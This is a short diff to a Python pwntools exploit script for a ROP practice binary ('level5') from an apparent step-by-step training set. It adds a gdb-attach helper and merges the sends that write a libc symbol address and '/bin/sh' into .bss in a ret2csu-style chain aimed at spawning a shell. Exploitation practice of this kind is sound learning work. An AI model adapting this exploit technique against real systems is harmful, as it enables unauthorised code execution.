@@ -9,6 +9,11 @@ from LibcSearcher import LibcSearcher
 #context.log_level = 'debug'
 #context(os='linux', arch='amd64', log_level='debug')
 
+def z(a=''):
+	gdb.attach(p,a)
+	if a == '':
+		raw_input()
+
 p = process('ROP_STEP_BY_STEP-master/linux_x64/level5.compile')
 #p = remote('127.0.0.1',10001)
 
@@ -78,8 +83,7 @@ def writeBss(symbol):
 
   callByCsuInit(read_got, 0, bss_addr, 16)
   sleep(1)  # would fail if not sleep!!! since send data would mess up
-  p.send(p64(symbol_addr))
-  p.send("/bin/sh\0") #it could be just "sh" for system, "/bin/sh" for execl
+  p.send(p64(symbol_addr) + "/bin/sh\0") #it could be just "sh" for system, "/bin/sh" for execl
   print "finish writing to bss"
 
 def pwnLibcall():
